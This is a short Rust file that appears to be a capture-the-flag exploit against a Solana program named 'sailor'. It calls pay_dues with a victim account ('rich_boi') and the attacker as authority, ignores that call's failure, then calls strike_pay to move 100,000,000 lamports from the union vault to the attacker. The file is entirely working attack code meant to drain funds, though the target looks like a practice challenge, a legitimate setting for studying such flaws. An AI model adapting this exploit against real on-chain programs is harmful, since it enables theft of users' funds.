#[cfg(not(feature = "no-entrypoint"))]
pub mod entrypoint {
    use anchor_lang::prelude::*;
    use solana_program::{
        account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, instruction::Instruction,
        msg, program::invoke, pubkey::Pubkey,
    };

    use borsh::BorshDeserialize;
    use sailor::cpi::{self, accounts};

    entrypoint!(process_instruction);

    #[derive(BorshDeserialize)]
    struct SolveInstruction {
        program: Pubkey,
    }

    pub fn process_instruction(
        _program_id: &Pubkey,
        accounts: &[AccountInfo],
        _instruction_data: &[u8],
    ) -> ProgramResult {
        let prog = accounts[0].clone();
        let hacker = accounts[1].clone();
        let vault = accounts[2].clone();
        let sailor_union = accounts[3].clone();
        let rich_boi = accounts[4].clone();
        let system_program = accounts[5].clone();

        let amt = 100_000_000;
        
        msg!("solving program {}", prog.key);

        let ctx = CpiContext::new(prog.clone(), accounts::PayDues {
            sailor_union: sailor_union.clone(),
            member: rich_boi.clone(),
            authority: hacker.clone(),
            vault: vault.clone(),
            system_program: system_program.clone()
        });

        msg!("rut roh");
        cpi::pay_dues(ctx, amt).ok();
        msg!("still going");

        let ctx = CpiContext::new(prog, accounts::StrikePay {
            sailor_union,
            member: hacker.clone(),
            authority: hacker.clone(),
            vault,
            system_program
        });

        cpi::strike_pay(ctx, amt)?;

        msg!("done solving");

        Ok(())
    }
}
